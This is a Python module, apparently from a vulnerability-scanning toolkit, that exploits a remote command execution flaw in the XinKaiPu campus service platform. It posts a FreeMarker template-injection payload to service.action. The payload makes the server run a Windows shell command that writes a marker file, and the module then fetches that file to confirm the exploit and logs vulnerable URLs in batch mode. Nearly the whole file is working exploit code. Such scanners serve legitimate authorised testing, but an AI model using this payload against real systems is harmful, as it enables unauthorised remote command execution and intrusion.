#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import time
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
import requests
import urllib3
urllib3.disable_warnings()
class XinKaiPu_Rce_Scan:
    def __init__(self):
        self.header = None
        self.proxy = None

    def send_payload(self,url):
        header = {
            "Host": url.split("://")[-1],
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Cookie": "JSESSIONID=6A13B163B0FA9A5F8FE53D4153AC13A4",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
        }
        payload = {
            "command": "GetFZinfo",
            "UnitCode": "<#assign ex = \"freemarker.template.utility.Execute\""
                        "?new()>${ex(\"cmd /c echo Danger!!! >./webapps/ROOT/csvuls.txt\")}"
        }
        url2 = url + '/service_transport/service.action'
        url3 = url + '/csvuls.txt'
        try:
            req = requests.post(url2, timeout=15,verify=self.verify,proxies=self.proxy,headers=header,json=payload)
            time.sleep(1)
            req2 = requests.get(url3, timeout=15,verify=self.verify,proxies=self.proxy,headers={"User-Agent":self.header})
            if "Danger!!!" in req2.text:
                if not self.batch:
                    OutPrintInfoSuc("XinKaiPu", f"存在新开普掌上校园服务管理平台service.action远程命令执行")
                    OutPrintInfo("XinKaiPu", url3)
                else:
                    OutPrintInfoSuc("XinKaiPu", f"存在远程命令执行漏洞 {url3}")
                    with open("./result/xinkaipu_rce.txt","a") as w:
                        w.write(f"{url3}\n")
                return True
            return False


        except Exception as e:
            if not self.batch:
                OutPrintInfo("XinKaiPu", "不存在新开普掌上校园服务管理平台service.action远程命令执行")
            return False
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        self.header = target["header"]
        proxy = target["proxy"]

        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)

        if not self.batch:
            OutPrintInfo("XinKaiPu", "开始检测新开普掌上校园服务管理平台service.action远程命令执行...")
        self.send_payload(url)
        if not self.batch:
            OutPrintInfo("XinKaiPu", "新开普掌上校园服务管理平台service.action远程命令执行漏洞检测结束")
